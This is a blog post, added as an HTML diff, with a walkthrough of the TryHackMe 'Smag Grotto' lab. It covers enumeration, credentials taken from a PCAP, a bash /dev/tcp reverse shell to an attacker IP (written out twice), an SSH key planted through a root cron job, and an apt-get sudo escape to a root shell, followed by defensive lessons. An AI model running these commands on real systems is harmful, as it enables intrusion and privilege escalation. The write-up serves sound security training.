@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Smag Grotto: TryHackMe Writeup — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A complete Smag Grotto walkthrough covering web enumeration, PCAP credential discovery, command execution, cron-based SSH key abuse, and apt-get privilege escalation.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/smag-grotto-tryhackme-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Smag Grotto: TryHackMe Writeup">
+  <meta property="og:description" content="A complete Smag Grotto walkthrough covering web enumeration, PCAP credential discovery, command execution, cron-based SSH key abuse, and apt-get privilege escalation.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/smag-grotto-tryhackme-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-10-03T17:24:45.120Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+  <meta property="article:tag" content="linux">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Smag Grotto: TryHackMe Writeup">
+  <meta name="twitter:description" content="A complete Smag Grotto walkthrough covering web enumeration, PCAP credential discovery, command execution, cron-based SSH key abuse, and apt-get privilege escalation.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Smag Grotto: TryHackMe Writeup","description":"A complete Smag Grotto walkthrough covering web enumeration, PCAP credential discovery, command execution, cron-based SSH key abuse, and apt-get privilege escalation.","datePublished":"2026-10-03T17:24:45.120Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/smag-grotto-tryhackme-writeup/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation, linux"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-smag-grotto-tryhackme-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>Smag Grotto: TryHackMe Writeup</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 14-09-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span><span class="card-cat-chip">linux</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<h1>Smag Grotto: TryHackMe Writeup</h1>
+<blockquote>
+<p>Follow the yellow brick road.</p>
+</blockquote>
+<p><strong>Room:</strong> Smag Grotto<br><strong>Platform:</strong> TryHackMe<br><strong>Target IP:</strong> <code>10.49.177.225</code></p>
+<p>This walkthrough covers the complete attack path used to compromise the Smag Grotto machine, starting with reconnaissance and web enumeration, analyzing a PCAP file for credentials, gaining command execution, abusing a writable SSH key backup through cron, and finally escalating privileges to root through an allowed <code>apt-get</code> command.</p>
+<h2>Initial Reconnaissance</h2>
+<p>The first step is to scan the target and identify the services running on it.</p>
+<pre><code class="language-bash">nmap -sV -sC 10.49.177.225
+</code></pre>
+<p>The scan reveals two important open services:</p>
+<ul>
+<li>HTTP</li>
+<li>SSH</li>
+</ul>
+<p><code>-sV</code> performs service and version detection, while <code>-sC</code> runs Nmap&#39;s default NSE scripts. This gives us a quick starting point without blindly throwing random tools at the machine, because apparently enumeration is still more effective than hoping the server feels generous.</p>
+<img width="1004" height="569" alt="Screenshot 2026-09-14 160524" src="https://github.com/user-attachments/assets/3c1b4447-5f68-4fc0-8e50-9e3e86e627fd" />
+
+
+<hr>
+<h1>Exploring the Web Application</h1>
+<p>Let&#39;s open the target website:</p>
+<pre><code class="language-text">http://10.49.177.225
+</code></pre>
+<p>The page displays:</p>
+<blockquote>
+<p>Welcome to Smag!</p>
+</blockquote>
+<p>The website also indicates that the page is still under development.</p>
+<img width="999" height="445" alt="Screenshot 2026-09-14 160628" src="https://github.com/user-attachments/assets/5e25faa8-46d2-437e-a88f-c34f491b85c8" />
+
+
+<p>At this stage, I checked the page source and inspected network requests, but nothing particularly interesting appeared.</p>
+<p>Since the visible application did not reveal anything useful, the next step was directory enumeration.</p>
+<h2>Directory Brute Forcing</h2>
+<p>Using Gobuster with a SecLists wordlist:</p>
+<pre><code class="language-bash">gobuster dir -u http://10.49.177.225/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+</code></pre>
+<p>The enumeration reveals an interesting directory:</p>
+<pre><code class="language-text">/mail
+</code></pre>
+<img width="830" height="480" alt="Screenshot 2026-09-14 160648" src="https://github.com/user-attachments/assets/cc343586-ee21-43cd-8c0b-896f0120c368" />
+
+
+<p>Opening <code>/mail</code> reveals a conversation containing an attached network log file.</p>
+<p>The attachment appears to be a PCAP file, so we download it for further analysis.</p>
+<hr>
+<h1>Analyzing the Network Capture</h1>
+<p>The downloaded PCAP file can be opened using Wireshark:</p>
+<pre><code class="language-bash">wireshark dHJhY2Uy.pcap
+</code></pre>
+<img width="1919" height="997" alt="Screenshot 2026-09-14 160952" src="https://github.com/user-attachments/assets/772b1f30-e954-4d28-bbe1-cd4ceb80d578" />
+
+<p>The capture contains only a small number of packets, so filtering is not really necessary.</p>
+<p>While inspecting the packets, packet 4 contains an HTTP request related to a login form.</p>
+<img width="1749" height="292" alt="Screenshot 2026-09-14 161008" src="https://github.com/user-attachments/assets/484bc584-6716-42a5-aedf-1d5a799cb262" />
+
+
+<p>Let&#39;s inspect it more closely.</p>
+<img width="958" height="393" alt="Screenshot 2026-09-14 161024" src="https://github.com/user-attachments/assets/affa1065-7a00-46d3-b7ab-e4d0408e3638" />
+
+
+
+<p>The network traffic reveals the following application URL:</p>
+<pre><code class="language-text">http://development.smag.thm/login.php
+</code></pre>
+<p>The captured request also contains login credentials.</p>
+<p>The credentials are intentionally masked in the screenshots to follow TryHackMe rules.</p>
+<p>This is a useful reminder that network captures can accidentally expose sensitive information when applications transmit credentials or other authentication data insecurely.</p>
+<hr>
+<h1>Adding the Development Host</h1>
+<p>Since the application uses a hostname instead of directly using the target IP, we need to map it locally.</p>
+<p>Edit the hosts file:</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>Add:</p>
+<pre><code class="language-text">10.49.177.225 development.smag.thm
+</code></pre>
+<img width="804" height="425" alt="Screenshot 2026-09-14 161728" src="https://github.com/user-attachments/assets/1645a596-6dcf-435c-91a7-5863093621bc" />
+
+
+<p>Now open:</p>
+<pre><code class="language-text">http://development.smag.thm
+</code></pre>
+<img width="941" height="395" alt="Screenshot 2026-09-14 161855" src="https://github.com/user-attachments/assets/ac659a7c-fe31-42ac-a0c9-47d407c58475" />
+
+
+<p>Then navigate to:</p>
+<pre><code class="language-text">http://development.smag.thm/login.php
+</code></pre>
+<p>Using the credentials recovered from the PCAP file, we can authenticate successfully.</p>
+<img width="1144" height="617" alt="image" src="https://github.com/user-attachments/assets/9f7c8a15-5ba5-4c6a-846c-e6421c83adb5" />
+
+
+<hr>
+<h1>Command Execution</h1>
+<p>After logging in, the application provides a command execution page.</p>
+<p>However, command output is not displayed directly in the browser.</p>
+<p>Instead of relying on visible output, we can attempt to obtain an interactive shell.</p>
+<h2>Starting a Netcat Listener</h2>
+<p>Before triggering the reverse shell, start a listener on the attacker machine:</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<p>The flags mean:</p>
+<ul>
+<li><code>-l</code> listens for incoming connections</li>
+<li><code>-v</code> enables verbose output</li>
+<li><code>-n</code> prevents DNS resolution</li>
+<li><code>-p 4444</code> specifies the listening port</li>
+</ul>
+<p>Now the attacker machine is waiting for the target to connect back.</p>
+<hr>
+<h1>Getting a Reverse Shell</h1>
+<p>Using the command execution functionality, execute:</p>
+<pre><code class="language-bash">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.134.12/4444 &lt;&amp;1&#39;
+</code></pre>
+<p>Replace the IP address with your own attacker machine or VPN interface IP.</p>
+<img width="1018" height="523" alt="Screenshot 2026-09-14 162227" src="https://github.com/user-attachments/assets/dd4319df-30af-45f0-a739-8a5d1f9aeb52" />
+
+
+<p>Once the command executes successfully, the Netcat listener receives a connection.</p>
+<img width="811" height="287" alt="Screenshot 2026-09-14 162239" src="https://github.com/user-attachments/assets/2d3197c8-6aec-45a3-b3ef-31228380a79f" />
+
+
+<p>We now have a shell on the target machine.</p>
+<hr>
+<h1>Enumerating the Target</h1>
+<p>Let&#39;s inspect the <code>/home</code> directory:</p>
+<pre><code class="language-bash">ls -la /home
+</code></pre>
+<p>We find a user named:</p>
+<pre><code class="language-text">jake
+</code></pre>
+<p>There is also a <code>user.txt</code> flag, but the current user does not have permission to read it.</p>
+<img width="486" height="316" alt="Screenshot 2026-09-14 163713" src="https://github.com/user-attachments/assets/59d749f0-d148-4206-990e-0c7aaf38f7dd" />
+
+
+<p>This means we need to move laterally or escalate privileges to the <code>jake</code> user.</p>
+<hr>
+<h1>Investigating Cron Jobs</h1>
+<p>After checking common privilege escalation techniques, an interesting entry appears in the system crontab.</p>
+<p>Run:</p>
+<pre><code class="language-bash">cat /etc/crontab
+</code></pre>
+<img width="1159" height="478" alt="Screenshot 2026-09-14 162423" src="https://github.com/user-attachments/assets/dcffca54-5914-4ecd-b6ff-4d4f51385567" />
+
+
+<p>The important line is:</p>
+<pre><code class="language-text">*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys
+</code></pre>
+<p>This cron job runs every minute as <code>root</code>.</p>
+<p>It copies:</p>
+<pre><code class="language-text">/opt/.backups/jake_id_rsa.pub.backup
+</code></pre>
+<p>into:</p>
+<pre><code class="language-text">/home/jake/.ssh/authorized_keys
+</code></pre>
+<p>This is the key vulnerability in the privilege escalation chain.</p>
+<p>If we can modify the backup file, we can replace Jake&#39;s authorized SSH key with our own public key.</p>
+<p>The cron job will then automatically install our key into Jake&#39;s account.</p>
+<hr>
+<h1>Generating an SSH Key</h1>
+<p>On the attacker machine, generate an RSA key pair if you do not already have one:</p>
+<pre><code class="language-bash">ssh-keygen -t rsa
+</code></pre>
+<img width="1003" height="579" alt="Screenshot 2026-09-14 163303" src="https://github.com/user-attachments/assets/21ea4b98-6af5-49a0-9fd9-e509f7d8238e" />
+
+<p>This creates a private key and a corresponding public key.</p>
+<p>The public key can be viewed using:</p>
+<pre><code class="language-bash">ssh-keygen -y -f ~/.ssh/id_rsa
+</code></pre>
+<img width="815" height="237" alt="Screenshot 2026-09-14 163350" src="https://github.com/user-attachments/assets/8d4d3b7c-932f-42c0-b875-23707edc4882" />
+
+
+<p>Copy the complete public key output.</p>
+<hr>
+<h1>Replacing Jake&#39;s Authorized Key Backup</h1>
+<p>Back on the target shell, write your public key into the backup file:</p>
+<pre><code class="language-bash">echo &quot;YOUR_PUBLIC_RSA_KEY&quot; &gt; /opt/.backups/jake_id_rsa.pub.backup
+</code></pre>
+<img width="814" height="226" alt="Screenshot 2026-09-14 163542" src="https://github.com/user-attachments/assets/06d633df-a40c-4fe0-8a21-b20331098898" />
+
+
+<p>To confirm that the key was written successfully:</p>
+<pre><code class="language-bash">cat /opt/.backups/jake_id_rsa.pub.backup
+</code></pre>
+<img width="811" height="223" alt="Screenshot 2026-09-14 163554" src="https://github.com/user-attachments/assets/e1248a1d-ba5d-434d-9f76-aa5b339d2ff2" />
+
+
+<p>Now wait for the cron job to execute.</p>
+<p>Within approximately one minute, the cron job copies our public key into:</p>
+<pre><code class="language-text">/home/jake/.ssh/authorized_keys
+</code></pre>
+<p>We can now authenticate as Jake over SSH.</p>
+<hr>
+<h1>Logging in as Jake</h1>
+<p>From the attacker machine:</p>
+<pre><code class="language-bash">ssh jake@10.49.177.225
+</code></pre>
+<img width="814" height="491" alt="Screenshot 2026-09-14 163801" src="https://github.com/user-attachments/assets/d67cceb9-0203-4594-8a07-6d5e5bd2ba10" />
+
+
+<p>We now have access as the <code>jake</code> user.</p>
+<p>The user flag can now be read:</p>
+<pre><code class="language-bash">cat ~/user.txt
+</code></pre>
+<img width="467" height="131" alt="Screenshot 2026-09-14 163833" src="https://github.com/user-attachments/assets/9e5d6365-9c17-473b-8cc0-6138a8fe0326" />
+
+
+<p>The flag is masked in the screenshot.</p>
+<hr>
+<h1>Privilege Escalation to Root</h1>
+<p>The next step is checking which commands Jake is allowed to execute with elevated privileges.</p>
+<p>Run:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<img width="807" height="225" alt="Screenshot 2026-09-14 163947" src="https://github.com/user-attachments/assets/d42b2e5a-25ea-407b-8d36-45a933ec9e61" />
+
+
+<p>The output shows that Jake can execute:</p>
+<pre><code class="language-text">/usr/bin/apt-get
+</code></pre>
+<p>as root without providing a password:</p>
+<pre><code class="language-text">(ALL : ALL) NOPASSWD: /usr/bin/apt-get
+</code></pre>
+<p>This is a dangerous sudo configuration because <code>apt-get</code> can be abused to execute commands with root privileges.</p>
+<p>A useful reference for known Unix binary privilege escalation techniques is:</p>
+<p><a href="https://gtfobins.github.io/gtfobins/apt-get/?utm_source=chatgpt.com">GTFOBins APT-GET techniques</a></p>
+<p>The following command can trigger a shell through an APT update hook:</p>
+<pre><code class="language-bash">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+</code></pre>
+<p>This results in a root shell.</p>
+<p>We can confirm our privileges with:</p>
+<pre><code class="language-bash">whoami
+</code></pre>
+<p>Expected output:</p>
+<pre><code class="language-text">root
+</code></pre>
+<p>Now read the root flag:</p>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<img width="779" height="194" alt="Screenshot 2026-09-14 164200" src="https://github.com/user-attachments/assets/b2c14019-6bcd-4344-bdef-bf24e9dd912e" />
+
+
+<p>Room completed.</p>
+<hr>
+<h1>Attack Path Summary</h1>
+<p>The complete attack chain looks like this:</p>
+<pre><code class="language-text">Nmap Scan
+    |
+    v
+HTTP Enumeration
+    |
+    v
+Gobuster Directory Discovery
+    |
+    v
+/mail Found
+    |
+    v
+PCAP Download
+    |
+    v
+Wireshark Analysis
+    |
+    v
+Credentials Recovered
+    |
+    v
+Login to development.smag.thm
+    |
+    v
+Command Execution
+    |
+    v
+Reverse Shell
+    |
+    v
+Cron Job Enumeration
+    |
+    v
+Writable SSH Key Backup
+    |
+    v
+Inject Attacker Public Key
+    |
+    v
+SSH Access as Jake
+    |
+    v
+sudo -l
+    |
+    v
+apt-get Allowed as Root
+    |
+    v
+Root Shell
+</code></pre>
+<h1>Security Lessons</h1>
+<h2>1. Directory Enumeration Still Matters</h2>
+<p>The main website did not expose anything immediately useful.</p>
+<p>However, directory brute forcing discovered <code>/mail</code>, which ultimately contained the PCAP file that started the entire attack chain.</p>
+<p>Hidden content is not protected content.</p>
+<p>Security through obscurity remains one of humanity&#39;s more optimistic engineering strategies.</p>
+<p>Sensitive directories should require proper authentication and authorization rather than simply relying on users not discovering them.</p>
+<hr>
+<h2>2. Network Traffic Can Leak Credentials</h2>
+<p>The PCAP file contained authentication information.</p>
+<p>In real environments, insecure network traffic can expose:</p>
+<ul>
+<li>Usernames</li>
+<li>Passwords</li>
+<li>Session cookies</li>
+<li>API tokens</li>
+<li>Internal application URLs</li>
+<li>Authentication requests</li>
+</ul>
+<p>Sensitive traffic should be protected with properly configured encryption such as HTTPS/TLS.</p>
+<hr>
+<h2>3. Development Systems Should Not Be Exposed Carelessly</h2>
+<p>The hostname:</p>
+<pre><code class="language-text">development.smag.thm
+</code></pre>
+<p>represents a development environment.</p>
+<p>Development applications often contain:</p>
+<ul>
+<li>Debug functionality</li>
+<li>Test credentials</li>
+<li>Command execution features</li>
+<li>Incomplete authentication</li>
+<li>Experimental code</li>
+</ul>
+<p>A development environment exposed to attackers can become the weakest point in an otherwise secure infrastructure.</p>
+<hr>
+<h2>4. Command Execution Is Extremely Dangerous</h2>
+<p>The authenticated application provided command execution capability.</p>
+<p>Any feature that passes user-controlled input to the operating system should be treated as highly dangerous.</p>
+<p>If arbitrary commands can be executed, an attacker may gain:</p>
+<ul>
+<li>File access</li>
+<li>System information</li>
+<li>Credential access</li>
+<li>Network access</li>
+<li>Reverse shells</li>
+<li>Lateral movement opportunities</li>
+</ul>
+<p>Command execution functionality should be avoided unless absolutely necessary and should never directly pass user input to a shell.</p>
+<hr>
+<h2>5. Cron Jobs Can Create Privilege Escalation Paths</h2>
+<p>The cron job itself was running as root:</p>
+<pre><code class="language-text">* * * * * root ...
+</code></pre>
+<p>The problem was not merely that cron existed.</p>
+<p>The problem was that a root-owned automated process trusted a file that an attacker could modify.</p>
+<p>This created a classic privilege escalation chain:</p>
+<pre><code class="language-text">Low-privileged write access
++
+Root automated process
+=
+Privilege escalation opportunity
+</code></pre>
+<p>Files consumed by privileged processes should have strict ownership and permissions.</p>
+<hr>
+<h2>6. SSH Authorized Keys Are Powerful Authentication Mechanisms</h2>
+<p>SSH public key authentication is normally very secure.</p>
+<p>However, security depends on controlling who can modify:</p>
+<pre><code class="language-text">~/.ssh/authorized_keys
+</code></pre>
+<p>If an attacker can cause their own public key to be added to a user&#39;s authorized keys, they effectively gain persistent access to that account.</p>
+<p>Authorized key files and any automated processes that generate them should be protected carefully.</p>
+<hr>
+<h2>7. Dangerous Sudo Rules Can Lead Directly to Root</h2>
+<p>The following rule was the final escalation point:</p>
+<pre><code class="language-text">NOPASSWD: /usr/bin/apt-get
+</code></pre>
+<p>Administrators sometimes allow specific binaries through <code>sudo</code> without realizing those binaries can execute additional programs.</p>
+<p>Before allowing any binary through sudo, administrators should understand whether it supports:</p>
+<ul>
+<li>Shell execution</li>
+<li>Hooks</li>
+<li>Plugins</li>
+<li>Configuration injection</li>
+<li>Script execution</li>
+<li>External command execution</li>
+</ul>
+<p>Tools documented on resources such as GTFOBins demonstrate why seemingly harmless binaries can become privilege escalation vectors.</p>
+<hr>
+<h1>Real-World Perspective</h1>
+<p>Smag Grotto demonstrates an important lesson about attack chains.</p>
+<p>There was no single magical vulnerability that immediately gave root access.</p>
+<p>Instead, the compromise involved multiple weaknesses:</p>
+<ol>
+<li>Discovering hidden content</li>
+<li>Recovering information from network traffic</li>
+<li>Accessing a development application</li>
+<li>Exploiting command execution</li>
+<li>Enumerating scheduled tasks</li>
+<li>Abusing SSH key management</li>
+<li>Identifying a dangerous sudo permission</li>
+<li>Escalating to root</li>
+</ol>
+<p>This is much closer to how many real penetration tests work.</p>
+<p>Attackers do not always need one catastrophic vulnerability.</p>
+<p>Several smaller mistakes can connect together into a complete compromise.</p>
+<p>The strongest habit during CTFs and real-world pentesting is therefore simple:</p>
+<pre><code class="language-text">Enumerate everything.
+Understand what you find.
+Follow the trust boundaries.
+Look for where low privilege interacts with high privilege.
+</code></pre>
+<p>That interaction is often where the interesting stuff lives.</p>
+<h2>Tools Used</h2>
+<ul>
+<li>Nmap</li>
+<li>Gobuster</li>
+<li>SecLists</li>
+<li>Wireshark</li>
+<li>Netcat</li>
+<li>OpenSSH</li>
+<li>GTFOBins</li>
+</ul>
+<h2>Commands Used</h2>
+<pre><code class="language-bash">nmap -sV -sC 10.49.177.225
+</code></pre>
+<pre><code class="language-bash">gobuster dir -u http://10.49.177.225/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+</code></pre>
+<pre><code class="language-bash">wireshark dHJhY2Uy.pcap
+</code></pre>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<pre><code class="language-bash">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.134.12/4444 &lt;&amp;1&#39;
+</code></pre>
+<pre><code class="language-bash">cat /etc/crontab
+</code></pre>
+<pre><code class="language-bash">ssh-keygen -t rsa
+</code></pre>
+<pre><code class="language-bash">ssh-keygen -y -f ~/.ssh/id_rsa
+</code></pre>
+<pre><code class="language-bash">echo &quot;YOUR_PUBLIC_RSA_KEY&quot; &gt; /opt/.backups/jake_id_rsa.pub.backup
+</code></pre>
+<pre><code class="language-bash">ssh jake@10.49.177.225
+</code></pre>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<pre><code class="language-bash">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+</code></pre>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<h1>Conclusion</h1>
+<p>Smag Grotto is a solid example of a chained Linux penetration testing scenario.</p>
+<p>The path from initial reconnaissance to root involved web enumeration, PCAP analysis, credential discovery, command execution, cron job abuse, SSH key persistence, and sudo privilege escalation.</p>
+<p>The biggest takeaway is that enumeration drives exploitation.</p>
